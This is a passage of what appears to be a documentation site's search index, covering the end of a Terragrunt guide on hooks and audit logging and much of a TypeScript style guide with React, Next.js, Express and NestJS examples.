after_hook \"notify_success\" {\n    commands     = [\"apply\"]\n    execute      = [\"bash\", \"${get_terragrunt_dir()}/scripts/notify.sh\", \"success\", \"${path_relative_to_include()}\"]\n    run_on_error = false\n  }\n\n  after_hook \"notify_failure\" {\n    commands     = [\"apply\"]\n    execute      = [\"bash\", \"${get_terragrunt_dir()}/scripts/notify.sh\", \"failure\", \"${path_relative_to_include()}\"]\n    run_on_error = true\n  }\n}\n\n## Ensure hook scripts have proper permissions\n## chmod 755 scripts/notify.sh\n## Never chmod 777!\n</code></pre>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#audit-and-compliance-logging","title":"Audit and Compliance Logging","text":"<p>Enable comprehensive logging for audit trails.</p> <pre><code>## Good - Log all Terragrunt operations\nterraform {\n  extra_arguments \"common_vars\" {\n    commands = get_terraform_commands_that_need_vars()\n\n    env_vars = {\n      TF_LOG       = \"INFO\"\n      TF_LOG_PATH  = \"${get_terragrunt_dir()}/terraform.log\"\n    }\n  }\n\n  before_hook \"log_start\" {\n    commands = [\"apply\", \"destroy\"]\n    execute  = [\n      \"bash\", \"-c\",\n      \"echo \\\"[$(date -u +%Y-%m-%dT%H:%M:%SZ)] User: $USER, \" +\n      \"Action: ${command}, Path: ${path_relative_to_include()}\\\" &gt;&gt; \" +\n      \"/var/log/terragrunt-audit.log\"\n    ]\n  }\n}\n</code></pre>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#tool-configurations","title":"Tool Configurations","text":"","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#terragrunt-cache","title":".terragrunt-cache","text":"<p>Add to <code>.gitignore</code>:</p> <pre><code>## Terragrunt cache\n.terragrunt-cache/\n**/.terragrunt-cache/\n\n## Terraform files\n*.tfstate\n*.tfstate.backup\n.terraform/\n</code></pre>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#vscode-extensions","title":"VSCode Extensions","text":"<ul> <li>Terraform: Syntax highlighting for HCL</li> <li>HashiCorp Terraform: Official HashiCorp extension</li> </ul>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#references","title":"References","text":"","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#official-documentation","title":"Official Documentation","text":"<ul> <li>Terragrunt Documentation</li> <li>Terragrunt Quick Start</li> <li>Terragrunt Configuration Reference</li> </ul>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#gruntwork-resources","title":"Gruntwork Resources","text":"<ul> <li>Gruntwork Infrastructure as Code Library</li> <li>How to Use Terragrunt</li> </ul>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/terragrunt/#best-practice-guides","title":"Best Practice Guides","text":"<ul> <li>Terragrunt Overview &amp; Best Practices</li> <li>Keep Your Terraform Code DRY</li> </ul> <p>Version: 1.0.0 Last Updated: 2025-10-28 Status: Active</p>","tags":["terragrunt","terraform","iac","dry","devops","infrastructure"]},{"location":"02_language_guides/typescript/","title":"TypeScript Style Guide","text":"","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#language-overview","title":"Language Overview","text":"<p>TypeScript is a statically typed superset of JavaScript that adds optional type annotations, interfaces, and compile-time type checking to enhance code quality and developer experience.</p>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#key-characteristics","title":"Key Characteristics","text":"<ul> <li>Paradigm: Multi-paradigm (object-oriented, functional, procedural)</li> <li>Type System: Static typing with type inference</li> <li>Compilation: Transpiles to JavaScript</li> <li>Runtime: Node.js (backend) or browser (frontend)</li> <li>Frameworks: React, Next.js, Express, NestJS</li> </ul>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#primary-use-cases","title":"Primary Use Cases","text":"<ul> <li>Full-stack web applications (React + Next.js + Node.js)</li> <li>RESTful and GraphQL APIs</li> <li>Single Page Applications (SPAs)</li> <li>Server-Side Rendering (SSR)</li> <li>CLI tools</li> <li>Serverless functions</li> </ul>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#typescript-configuration","title":"TypeScript Configuration","text":"","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#tsconfigjson-for-new-projects","title":"tsconfig.json for New Projects","text":"<p>Use <code>strict: true</code> for all new code:</p> <pre><code>{\n  \"compilerOptions\": {\n    \"target\": \"ES2022\",\n    \"lib\": [\"ES2022\"],\n    \"module\": \"ESNext\",\n    \"moduleResolution\": \"bundler\",\n    \"strict\": true,\n    \"esModuleInterop\": true,\n    \"skipLibCheck\": true,\n    \"forceConsistentCasingInFileNames\": true,\n    \"resolveJsonModule\": true,\n    \"isolatedModules\": true,\n    \"noUncheckedIndexedAccess\": true,\n    \"noUnusedLocals\": true,\n    \"noUnusedParameters\": true,\n    \"noFallthroughCasesInSwitch\": true,\n    \"allowUnreachableCode\": false,\n    \"allowUnusedLabels\": false\n  },\n  \"include\": [\"src/**/*\"],\n  \"exclude\": [\"node_modules\", \"dist\", \"build\"]\n}\n</code></pre>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#tsconfigjson-for-legacy-projects","title":"tsconfig.json for Legacy Projects","text":"<p>Relax strict mode when migrating JavaScript to TypeScript:</p> <pre><code>{\n  \"compilerOptions\": {\n    \"target\": \"ES2022\",\n    \"lib\": [\"ES2022\", \"DOM\"],\n    \"module\": \"ESNext\",\n    \"strict\": false,\n    \"noImplicitAny\": false,\n    \"strictNullChecks\": false,\n    \"allowJs\": true,\n    \"checkJs\": false\n  }\n}\n</code></pre> <p>Gradually enable strict checks file-by-file with <code>// @ts-check</code> comments.</p>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#quick-reference","title":"Quick Reference","text":"Category Convention Example Notes Naming Variables <code>camelCase</code> <code>userName</code>, <code>apiResponse</code> Descriptive, lowercase first letter Constants <code>UPPER_SNAKE_CASE</code> <code>MAX_RETRIES</code>, <code>API_URL</code> Module-level constants, all uppercase Functions <code>camelCase</code> <code>getUser()</code>, <code>validateInput()</code> Verbs, descriptive action names Interfaces <code>PascalCase</code> <code>User</code>, <code>ApiResponse</code> Nouns, no 'I' prefix (modern convention) Types <code>PascalCase</code> <code>UserId</code>, <code>StatusCode</code> Nouns, capitalize each word Classes <code>PascalCase</code> <code>UserService</code>, <code>DataProcessor</code> Nouns, capitalize each word Enums <code>PascalCase</code> <code>Color</code>, <code>HttpStatus</code> Singular nouns Enum Members <code>PascalCase</code> <code>Color.Red</code>, <code>HttpStatus.Ok</code> PascalCase (not UPPER_CASE) Methods <code>camelCase</code> <code>calculateTotal()</code>, <code>isValid()</code> Like functions, instance/class methods Private Fields <code>#privateField</code> <code>#cache</code>, <code>#internalState</code> Use private class fields (TC39) Formatting Line Length 100 characters <code>// Prettier default</code> Max 100 characters per line Indentation 2 spaces <code>if (condition) {</code> 2 spaces, never tabs Semicolons Required <code>const x = 5;</code> Always use semicolons String Quotes Double quotes <code>\"hello world\"</code> Prefer double, single for JSX Imports Order External, internal, types <code>import React from \"react\"</code> Group and alphabetize Style ES6 imports <code>import { User } from \"./types\"</code> Named or default imports Type Imports <code>import type</code> <code>import type { User } from \"./types\"</code> Use for type-only imports Types Annotations Explicit when needed <code>const user: User = getData()</code> Leverage type inference Return Types Always on functions <code>function foo(): string { }</code> Explicit return types required Generics <code>T</code>, <code>K</code>, <code>V</code> <code>function map&lt;T&gt;(items: T[])</code> Single letter for simple, descriptive for complex Files Components <code>PascalCase.tsx</code> <code>UserProfile.tsx</code>, <code>Button.tsx</code> React components Utilities <code>camelCase.ts</code> <code>apiClient.ts</code>, <code>validators.ts</code> Utility modules Types <code>camelCase.types.ts</code> <code>user.types.ts</code>, <code>api.types.ts</code> Type definition files Tests <code>*.test.ts</code> or <code>*.spec.ts</code> <code>user.test.ts</code>, <code>api.spec.ts</code> Co-located with source","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#naming-conventions","title":"Naming Conventions","text":"<pre><code>// Interfaces - PascalCase with 'I' prefix (optional, team preference)\ninterface User {\n  id: string;\n  name: string;\n  email: string;\n}\n\n// Alternative without prefix (more common in modern TS)\ninterface User {\n  id: string;\n  name: string;\n}\n\n// Types - PascalCase\ntype UserId = string;\ntype UserRole = 'admin' | 'user' | 'guest';\n\n// Classes - PascalCase\nclass UserService {\n  private readonly repository: UserRepository;\n\n  constructor(repository: UserRepository) {\n    this.repository = repository;\n  }\n}\n\n// Functions - camelCase\nfunction getUserById(id: string): Promise&lt;User&gt; {\n  // Implementation\n}\n\n// Variables - camelCase\nconst currentUser: User = { id: '1', name: 'John', email: 'john@example.com' };\nconst userCount = 42;\n\n// Constants - UPPER_SNAKE_CASE\nconst MAX_RETRY_ATTEMPTS = 3;\nconst API_BASE_URL = 'https://api.example.com';\n\n// Enums - PascalCase for enum, UPPER_CASE for values\nenum UserRole {\n  ADMIN = 'ADMIN',\n  USER = 'USER',\n  GUEST = 'GUEST',\n}\n\n// Generic type parameters - Single uppercase letter or PascalCase\nfunction identity&lt;T&gt;(value: T): T {\n  return value;\n}\n\nfunction map&lt;TInput, TOutput&gt;(\n  items: TInput[],\n  transform: (item: TInput) =&gt; TOutput\n): TOutput[] {\n  return items.map(transform);\n}\n</code></pre>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#type-definitions","title":"Type Definitions","text":"","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#interfaces-vs-types","title":"Interfaces vs Types","text":"<pre><code>// Use interfaces for object shapes (can be extended)\ninterface BaseUser {\n  id: string;\n  name: string;\n}\n\ninterface AdminUser extends BaseUser {\n  role: 'admin';\n  permissions: string[];\n}\n\n// Use types for unions, intersections, primitives\ntype UserId = string;\ntype UserRole = 'admin' | 'user' | 'guest';\ntype Result&lt;T&gt; = { success: true; data: T } | { success: false; error: string };\n\n// Intersection types\ntype TimestampedUser = User &amp; {\n  createdAt: Date;\n  updatedAt: Date;\n};\n</code></pre>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#utility-types","title":"Utility Types","text":"<pre><code>// Partial - Make all properties optional\ntype PartialUser = Partial&lt;User&gt;;\n\n// Required - Make all properties required\ntype RequiredUser = Required&lt;User&gt;;\n\n// Pick - Select subset of properties\ntype UserSummary = Pick&lt;User, 'id' | 'name'&gt;;\n\n// Omit - Exclude properties\ntype UserWithoutEmail = Omit&lt;User, 'email'&gt;;\n\n// Record - Map of keys to values\ntype UserMap = Record&lt;string, User&gt;;\n\n// Readonly - Make properties immutable\ntype ReadonlyUser = Readonly&lt;User&gt;;\n\n// ReturnType - Extract function return type\ntype GetUserResult = ReturnType&lt;typeof getUserById&gt;;\n\n// Parameters - Extract function parameter types\ntype GetUserParams = Parameters&lt;typeof getUserById&gt;;\n\n// NonNullable - Exclude null and undefined\ntype NonNullableString = NonNullable&lt;string | null | undefined&gt;;\n</code></pre>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#generics","title":"Generics","text":"<pre><code>// Generic function\nfunction first&lt;T&gt;(arr: T[]): T | undefined {\n  return arr[0];\n}\n\n// Generic interface\ninterface ApiResponse&lt;T&gt; {\n  data: T;\n  status: number;\n  message: string;\n}\n\n// Generic class\nclass Repository&lt;T&gt; {\n  private items: T[] = [];\n\n  add(item: T): void {\n    this.items.push(item);\n  }\n\n  findById(id: string): T | undefined {\n    return this.items.find((item: any) =&gt; item.id === id);\n  }\n\n  getAll(): T[] {\n    return [...this.items];\n  }\n}\n\n// Constrained generics\ninterface HasId {\n  id: string;\n}\n\nfunction findById&lt;T extends HasId&gt;(items: T[], id: string): T | undefined {\n  return items.find((item) =&gt; item.id === id);\n}\n\n// Multiple type parameters\nfunction merge&lt;T, U&gt;(obj1: T, obj2: U): T &amp; U {\n  return { ...obj1, ...obj2 };\n}\n</code></pre>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#enums-and-const-assertions","title":"Enums and Const Assertions","text":"<pre><code>// String enum (preferred for serialization)\nenum UserRole {\n  ADMIN = 'ADMIN',\n  USER = 'USER',\n  GUEST = 'GUEST',\n}\n\n// Numeric enum (avoid unless needed)\nenum HttpStatus {\n  OK = 200,\n  NOT_FOUND = 404,\n  SERVER_ERROR = 500,\n}\n\n// Const assertions (alternative to enums)\nconst UserRole = {\n  ADMIN: 'ADMIN',\n  USER: 'USER',\n  GUEST: 'GUEST',\n} as const;\n\ntype UserRole = (typeof UserRole)[keyof typeof UserRole];\n\n// Union of literal types (most flexible)\ntype UserRole = 'admin' | 'user' | 'guest';\n\n// Const assertion for readonly arrays\nconst ALLOWED_ROLES = ['admin', 'user', 'guest'] as const;\ntype UserRole = (typeof ALLOWED_ROLES)[number];\n</code></pre>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#module-organization","title":"Module Organization","text":"","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#file-structure","title":"File Structure","text":"<pre><code>src/\n\u251c\u2500\u2500 types/\n\u2502   \u251c\u2500\u2500 user.ts\n\u2502   \u251c\u2500\u2500 api.ts\n\u2502   \u2514\u2500\u2500 index.ts\n\u251c\u2500\u2500 services/\n\u2502   \u251c\u2500\u2500 user.service.ts\n\u2502   \u251c\u2500\u2500 auth.service.ts\n\u2502   \u2514\u2500\u2500 index.ts\n\u251c\u2500\u2500 utils/\n\u2502   \u251c\u2500\u2500 validation.ts\n\u2502   \u251c\u2500\u2500 formatting.ts\n\u2502   \u2514\u2500\u2500 index.ts\n\u2514\u2500\u2500 index.ts\n</code></pre>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#importexport-conventions","title":"Import/Export Conventions","text":"<pre><code>// Named exports (preferred)\n// user.ts\nexport interface User {\n  id: string;\n  name: string;\n}\n\nexport function createUser(name: string): User {\n  return { id: crypto.randomUUID(), name };\n}\n\n// Barrel exports in index.ts\nexport * from './user';\nexport * from './admin';\n\n// Import usage\nimport { User, createUser } from './types';\n\n// Default exports (use sparingly)\nexport default class UserService {\n  // Implementation\n}\n\n// Avoid wildcard imports\n// Bad\nimport * as utils from './utils';\n\n// Good\nimport { formatDate, validateEmail } from './utils';\n</code></pre>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#react-patterns","title":"React Patterns","text":"","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#functional-components-with-typescript","title":"Functional Components with TypeScript","text":"<pre><code>// React component with props interface\ninterface UserCardProps {\n  user: User;\n  onEdit: (user: User) =&gt; void;\n  className?: string;\n}\n\nexport function UserCard({ user, onEdit, className }: UserCardProps) {\n  return (\n    &lt;div className={className}&gt;\n      &lt;h2&gt;{user.name}&lt;/h2&gt;\n      &lt;p&gt;{user.email}&lt;/p&gt;\n      &lt;button onClick={() =&gt; onEdit(user)}&gt;Edit&lt;/button&gt;\n    &lt;/div&gt;\n  );\n}\n\n// Component with children\ninterface ContainerProps {\n  children: React.ReactNode;\n  title?: string;\n}\n\nexport function Container({ children, title }: ContainerProps) {\n  return (\n    &lt;div&gt;\n      {title &amp;&amp; &lt;h1&gt;{title}&lt;/h1&gt;}\n      {children}\n    &lt;/div&gt;\n  );\n}\n\n// Component with generic props\ninterface ListProps&lt;T&gt; {\n  items: T[];\n  renderItem: (item: T) =&gt; React.ReactNode;\n  keyExtractor: (item: T) =&gt; string;\n}\n\nexport function List&lt;T&gt;({ items, renderItem, keyExtractor }: ListProps&lt;T&gt;) {\n  return (\n    &lt;ul&gt;\n      {items.map((item) =&gt; (\n        &lt;li key={keyExtractor(item)}&gt;{renderItem(item)}&lt;/li&gt;\n      ))}\n    &lt;/ul&gt;\n  );\n}\n</code></pre>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#react-hooks-with-typescript","title":"React Hooks with TypeScript","text":"<pre><code>// useState with type inference\nconst [count, setCount] = useState(0);\nconst [user, setUser] = useState&lt;User | null&gt;(null);\n\n// useState with explicit type\nconst [users, setUsers] = useState&lt;User[]&gt;([]);\n\n// useReducer with discriminated unions\ntype Action =\n  | { type: 'SET_LOADING'; payload: boolean }\n  | { type: 'SET_DATA'; payload: User[] }\n  | { type: 'SET_ERROR'; payload: string };\n\ninterface State {\n  data: User[];\n  loading: boolean;\n  error: string | null;\n}\n\nfunction reducer(state: State, action: Action): State {\n  switch (action.type) {\n    case 'SET_LOADING':\n      return { ...state, loading: action.payload };\n    case 'SET_DATA':\n      return { ...state, data: action.payload, loading: false };\n    case 'SET_ERROR':\n      return { ...state, error: action.payload, loading: false };\n    default:\n      return state;\n  }\n}\n\nconst [state, dispatch] = useReducer(reducer, {\n  data: [],\n  loading: false,\n  error: null,\n});\n\n// useRef with DOM elements\nconst inputRef = useRef&lt;HTMLInputElement&gt;(null);\n\n// useRef with mutable values\nconst timeoutRef = useRef&lt;number | null&gt;(null);\n\n// Custom hook\nfunction useLocalStorage&lt;T&gt;(key: string, initialValue: T) {\n  const [storedValue, setStoredValue] = useState&lt;T&gt;(() =&gt; {\n    try {\n      const item = window.localStorage.getItem(key);\n      return item ? JSON.parse(item) : initialValue;\n    } catch (error) {\n      return initialValue;\n    }\n  });\n\n  const setValue = (value: T | ((val: T) =&gt; T)) =&gt; {\n    try {\n      const valueToStore = value instanceof Function ? value(storedValue) : value;\n      setStoredValue(valueToStore);\n      window.localStorage.setItem(key, JSON.stringify(valueToStore));\n    } catch (error) {\n      console.error(error);\n    }\n  };\n\n  return [storedValue, setValue] as const;\n}\n</code></pre>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#nextjs-patterns","title":"Next.js Patterns","text":"","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#page-components","title":"Page Components","text":"<pre><code>// app/users/page.tsx\ninterface PageProps {\n  params: { id: string };\n  searchParams: { [key: string]: string | string[] | undefined };\n}\n\nexport default async function UsersPage({ params, searchParams }: PageProps) {\n  const users = await fetchUsers();\n\n  return (\n    &lt;div&gt;\n      &lt;h1&gt;Users&lt;/h1&gt;\n      &lt;UserList users={users} /&gt;\n    &lt;/div&gt;\n  );\n}\n</code></pre>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#api-routes","title":"API Routes","text":"<pre><code>// app/api/users/route.ts\nimport { NextRequest, NextResponse } from 'next/server';\n\nexport async function GET(request: NextRequest) {\n  try {\n    const users = await db.user.findMany();\n    return NextResponse.json(users);\n  } catch (error) {\n    return NextResponse.json({ error: 'Failed to fetch users' }, { status: 500 });\n  }\n}\n\nexport async function POST(request: NextRequest) {\n  try {\n    const body = await request.json();\n    const user = await db.user.create({ data: body });\n    return NextResponse.json(user, { status: 201 });\n  } catch (error) {\n    return NextResponse.json({ error: 'Failed to create user' }, { status: 500 });\n  }\n}\n</code></pre>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#server-actions","title":"Server Actions","text":"<pre><code>// app/actions/user.ts\n'use server';\n\nimport { revalidatePath } from 'next/cache';\n\nexport async function createUser(formData: FormData): Promise&lt;{ success: boolean; error?: string }&gt; {\n  try {\n    const name = formData.get('name') as string;\n    const email = formData.get('email') as string;\n\n    await db.user.create({ data: { name, email } });\n    revalidatePath('/users');\n\n    return { success: true };\n  } catch (error) {\n    return { success: false, error: 'Failed to create user' };\n  }\n}\n</code></pre>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#nodejs-patterns","title":"Node.js Patterns","text":"","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#express-with-typescript","title":"Express with TypeScript","text":"<pre><code>// src/types/express.d.ts\nimport { User } from './user';\n\ndeclare global {\n  namespace Express {\n    interface Request {\n      user?: User;\n    }\n  }\n}\n\n// src/routes/users.ts\nimport { Router, Request, Response, NextFunction } from 'express';\n\nconst router = Router();\n\ninterface CreateUserRequest {\n  name: string;\n  email: string;\n}\n\nrouter.post('/users', async (req: Request&lt;{}, {}, CreateUserRequest&gt;, res: Response) =&gt; {\n  try {\n    const { name, email } = req.body;\n    const user = await createUser(name, email);\n    res.status(201).json(user);\n  } catch (error) {\n    res.status(500).json({ error: 'Failed to create user' });\n  }\n});\n\nrouter.get('/users/:id', async (req: Request&lt;{ id: string }&gt;, res: Response) =&gt; {\n  try {\n    const user = await getUserById(req.params.id);\n    if (!user) {\n      return res.status(404).json({ error: 'User not found' });\n    }\n    res.json(user);\n  } catch (error) {\n    res.status(500).json({ error: 'Failed to fetch user' });\n  }\n});\n\nexport { router as userRouter };\n</code></pre>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#nestjs-service","title":"NestJS Service","text":"<pre><code>// users/users.service.ts\nimport { Injectable, NotFoundException } from '@nestjs/common';\nimport { InjectRepository } from '@nestjs/typeorm';\nimport { Repository } from 'typeorm';\n\n@Injectable()\nexport class UsersService {\n  constructor(\n    @InjectRepository(User)\n    private readonly userRepository: Repository&lt;User&gt;\n  ) {}\n\n  async findAll(): Promise&lt;User[]&gt; {\n    return this.userRepository.find();\n  }\n\n  async findOne(id: string): Promise&lt;User&gt; {\n    const user = await this.userRepository.findOne({ where: { id } });\n    if (!user) {\n      throw new NotFoundException(`User with ID ${id} not found`);\n    }\n    return user;\n  }\n\n  async create(createUserDto: CreateUserDto): Promise&lt;User&gt; {\n    const user = this.userRepository.create(createUserDto);\n    return this.userRepository.save(user);\n  }\n}\n</code></pre>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#async-patterns","title":"Async Patterns","text":"<pre><code>// Async function with typed return\nasync function fetchUser(id: string): Promise&lt;User&gt; {\n  const response = await fetch(`/api/users/${id}`);\n  if (!response.ok) {\n    throw new Error('Failed to fetch user');\n  }\n  return response.json();\n}\n\n// Promise.all with type inference\nconst [users, posts, comments] = await Promise.all([\n  fetchUsers(),\n  fetchPosts(),\n  fetchComments(),\n]);\n\n// Async error handling\nasync function safeCreateUser(name: string): Promise&lt;User | null&gt; {\n  try {\n    return await createUser(name);\n  } catch (error) {\n    console.error('Failed to create user:', error);\n    return null;\n  }\n}\n\n// Async generators\nasync function* fetchPagedUsers(pageSize: number): AsyncGenerator&lt;User[], void, unknown&gt; {\n  let page = 0;\n  let hasMore = true;\n\n  while (hasMore) {\n    const users = await fetchUsersPage(page, pageSize);\n    if (users.length === 0) {\n      hasMore = false;\n    } else {\n      yield users;\n      page++;\n    }\n  }\n}\n\n// Usage\nfor await (const userPage of fetchPagedUsers(10)) {\n  console.log(`Processing ${userPage.length} users`);\n}\n</code></pre>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#error-handling","title":"Error Handling","text":"<pre><code>// Custom error classes\nclass ApiError extends Error {\n  constructor(\n    public statusCode: number,\n    message: string,\n    public details?: unknown\n  ) {\n    super(message);\n    this.name = 'ApiError';\n  }\n}\n\nclass ValidationError extends Error {\n  constructor(\n    public field: string,\n    message: string\n  ) {\n    super(message);\n    this.name = 'ValidationError';\n  }\n}\n\n// Result type pattern\ntype Result&lt;T, E = Error&gt; = { success: true; data: T } | { success: false; error: E };\n\nasync function fetchUser(id: string): Promise&lt;Result&lt;User&gt;&gt; {\n  try {\n    const user = await db.user.findUnique({ where: { id } });\n    if (!user) {\n      return { success: false, error: new Error('User not found') };\n    }\n    return { success: true, data: user };\n  } catch (error) {\n    return { success: false, error: error as Error };\n  }\n}\n\n// Usage\nconst result = await fetchUser('123');\nif (result.success) {\n  console.log(result.data.name);\n} else {\n  console.error(result.error.message);\n}\n\n// Type guards for error handling\nfunction isApiError(error: unknown): error is ApiError {\n  return error instanceof ApiError;\n}\n\ntry {\n  await fetchUser('123');\n} catch (error) {\n  if (isApiError(error)) {\n    console.error(`API Error ${error.statusCode}: ${error.message}`);\n  } else {\n    console.error('Unknown error:', error);\n  }\n}\n</code></pre>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#testing-with-jestvitest","title":"Testing with Jest/Vitest","text":"<pre><code>// sum.test.ts\nimport { describe, it, expect } from 'vitest';\n\ndescribe('sum', () =&gt; {\n  it('should add two numbers', () =&gt; {\n    expect(sum(1, 2)).toBe(3);\n  });\n\n  it('should handle negative numbers', () =&gt; {\n    expect(sum(-1, -2)).toBe(-3);\n  });\n});\n\n// Mocking\nimport { vi } from 'vitest';\n\ninterface UserRepository {\n  findById(id: string): Promise&lt;User | null&gt;;\n}\n\nconst mockRepository: UserRepository = {\n  findById: vi.fn(async (id: string) =&gt; ({\n    id,\n    name: 'Test User',\n    email: 'test@example.com',\n  })),\n};\n\n// React component testing\nimport { render, screen } from '@testing-library/react';\nimport userEvent from '@testing-library/user-event';\n\ndescribe('UserCard', () =&gt; {\n  it('should render user information', () =&gt; {\n    const user = { id: '1', name: 'John Doe', email: 'john@example.com' };\n    render(&lt;UserCard user={user} onEdit={vi.fn()} /&gt;);\n\n    expect(screen.getByText('John Doe')).toBeInTheDocument();\n    expect(screen.getByText('john@example.com')).toBeInTheDocument();\n  });\n\n  it('should call onEdit when button is clicked', async () =&gt; {\n    const user = { id: '1', name: 'John Doe', email: 'john@example.com' };\n    const onEdit = vi.fn();\n    render(&lt;UserCard user={user} onEdit={onEdit} /&gt;);\n\n    await userEvent.click(screen.getByRole('button', { name: /edit/i }));\n\n    expect(onEdit).toHaveBeenCalledWith(user);\n  });\n});\n</code></pre>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#anti-patterns","title":"Anti-Patterns","text":"","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#avoid-any-type","title":"\u274c Avoid: any Type","text":"<pre><code>// Bad\nfunction processData(data: any) {\n  return data.value;\n}\n\n// Good - Use unknown for truly unknown types\nfunction processData(data: unknown) {\n  if (typeof data === 'object' &amp;&amp; data !== null &amp;&amp; 'value' in data) {\n    return (data as { value: number }).value;\n  }\n  throw new Error('Invalid data');\n}\n\n// Better - Define proper types\ninterface DataWithValue {\n  value: number;\n}\n\nfunction processData(data: DataWithValue) {\n  return data.value;\n}\n</code></pre>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#avoid-non-null-assertions","title":"\u274c Avoid: Non-null Assertions","text":"<pre><code>// Bad - Using ! can hide bugs\nconst user = users.find((u) =&gt; u.id === id)!;\n\n// Good - Handle null case explicitly\nconst user = users.find((u) =&gt; u.id === id);\nif (!user) {\n  throw new Error('User not found');\n}\n</code></pre>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#avoid-type-assertions-without-validation","title":"\u274c Avoid: Type Assertions Without Validation","text":"<pre><code>// Bad - Unsafe type assertion\nconst data = JSON.parse(response) as User;\n\n// Good - Validate before asserting\nfunction isUser(obj: unknown): obj is User {\n  return (\n    typeof obj === 'object' &amp;&amp;\n    obj !== null &amp;&amp;\n    'id' in obj &amp;&amp;\n    'name' in obj &amp;&amp;\n    typeof obj.id === 'string' &amp;&amp;\n    typeof obj.name === 'string'\n  );\n}\n\nconst data = JSON.parse(response);\nif (!isUser(data)) {\n  throw new Error('Invalid user data');\n}\n</code></pre>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#avoid-implicit-any-in-function-parameters","title":"\u274c Avoid: Implicit any in Function Parameters","text":"<pre><code>// Bad - Implicit any\nfunction processItems(items) {  // \u274c Parameter has implicit 'any' type\n  return items.map(item =&gt; item.value);\n}\n\n// Good - Explicit types\ninterface Item {\n  value: number;\n}\n\nfunction processItems(items: Item[]): number[] {  // \u2705 Fully typed\n  return items.map(item =&gt; item.value);\n}\n</code></pre>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#avoid-using-enums-for-string-constants","title":"\u274c Avoid: Using Enums for String Constants","text":"<pre><code>// Bad - Enums generate runtime code\nenum Color {  // \u274c Adds unnecessary runtime code\n  Red = 'red',\n  Green = 'green',\n  Blue = 'blue'\n}\n\n// Good - Use const objects or unions\nconst Color = {  // \u2705 No runtime overhead (with as const)\n  Red: 'red',\n  Green: 'green',\n  Blue: 'blue'\n} as const;\n\ntype Color = typeof Color[keyof typeof Color];\n\n// Or even better - Use union types\ntype Color = 'red' | 'green' | 'blue';  // \u2705 Pure type, no runtime\n</code></pre>","tags":["typescript","javascript","react","nextjs","nodejs"]},{"location":"02_language_guides/typescript/#avoid-overusing-optional-chaining","title":"\u274c Avoid: Overusing Optional Chaining","text":"<pre><code>// Bad - Optional chaining everywhere\nfunction getUserEmail(user?: User) {\n  return user?.profile?.contact?.email?.toLowerCase();  // \u274c Hard to debug\n}\n\n// Good - Explicit null checks\nfunction getUserEmail(user: User | undefined): string | undefined {\n  if (!user?.profile?.contact?.email) {  // \u2705 Clear validation\n    return undefined;\n  }\n  return user.profile.contact.email.toLowerCase();\n}\n\n// Better - Validate at boundaries\nfunction getUserEmail(user: User): string {  // \u2705 Require valid user\n  if (!user.profile?.contact?.email) {\n    throw new Error('User email not found');\n  }\n  return 